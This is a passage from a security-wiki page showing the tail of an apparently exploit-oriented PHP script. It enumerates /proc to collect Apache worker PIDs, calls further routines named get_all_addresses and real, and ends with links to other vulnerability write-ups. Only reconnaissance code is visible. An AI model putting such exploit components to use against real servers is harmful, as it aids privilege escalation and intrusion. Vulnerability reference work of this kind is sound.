<span class="n">function</span> <span class="n">get_workers_pids</span>()
{
    <span class="n">o</span>(<span class="s">&#39;Obtaining apache workers PIDs&#39;</span>);
    <span class="nv">$pids</span> = [];
    <span class="nv">$cmd</span> = <span class="n">file_get_contents</span>(<span class="s">&#39;/proc/self/cmdline&#39;</span>);
    <span class="nv">$processes</span> = <span class="n">glob</span>(<span class="s">&#39;/proc/*&#39;</span>);
    <span class="n">foreach</span>(<span class="nv">$processes</span> <span class="n">as</span> <span class="nv">$process</span>)
    {
        <span class="k">if</span>(!<span class="n">preg_match</span>(<span class="s">&#39;#^/proc/([0-9]+)$#&#39;</span>, <span class="nv">$process</span>, <span class="nv">$match</span>))
            <span class="n">continue</span>;
        <span class="nv">$pid</span> = (<span class="n">int</span>) <span class="nv">$match</span>[<span class="mi">1</span>];
        <span class="k">if</span>(
            !<span class="n">is_readable</span>(<span class="nv">$process</span> . <span class="s">&#39;/cmdline&#39;</span>) ||
            !<span class="n">is_readable</span>(<span class="nv">$process</span> . <span class="s">&#39;/status&#39;</span>)
        )
            <span class="n">continue</span>;
        <span class="k">if</span>(<span class="nv">$cmd</span> !== <span class="n">file_get_contents</span>(<span class="nv">$process</span> . <span class="s">&#39;/cmdline&#39;</span>))
            <span class="n">continue</span>;

        <span class="nv">$status</span> = <span class="n">file_get_contents</span>(<span class="nv">$process</span> . <span class="s">&#39;/status&#39;</span>);
        <span class="n">foreach</span>(<span class="n">explode</span>(<span class="s">&quot;\n&quot;</span>, <span class="nv">$status</span>) <span class="n">as</span> <span class="nv">$line</span>)
        {
            <span class="k">if</span>(
                <span class="n">strpos</span>(<span class="nv">$line</span>, <span class="s">&#39;Uid:&#39;</span>) === <span class="mi">0</span> &amp;&amp;
                <span class="n">preg_match</span>(<span class="s">&#39;#\b&#39;</span> . <span class="n">posix_getuid</span>() . <span class="s">&#39;\b#&#39;</span>, <span class="nv">$line</span>)
            )
            {
                <span class="n">o</span>(<span class="s">&#39;  Found apache worker: &#39;</span> . <span class="nv">$pid</span>);
                <span class="nv">$pids</span>[<span class="nv">$pid</span>] = <span class="nv">$pid</span>;
                <span class="nb">break</span>;
            }

        }
    }

    <span class="n">o</span>(<span class="s">&#39;Got &#39;</span> . <span class="n">sizeof</span>(<span class="nv">$pids</span>) . <span class="s">&#39; PIDs.&#39;</span>);
    <span class="n">o</span>(<span class="s">&#39;&#39;</span>);

    <span class="k">return</span> <span class="nv">$pids</span>;
}

<span class="nv">$addresses</span> = <span class="n">get_all_addresses</span>();
<span class="nv">$workers_pids</span> = <span class="n">get_workers_pids</span>();
<span class="n">real</span>();
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../ApachOFBiz/ApaceOFBizgetJSONuiLabelArray%E5%AD%98%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0ssrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../ApachOFBiz/ApaceOFBizgetJSONuiLabelArray%E5%AD%98%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0ssrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-15715）Apache解析漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>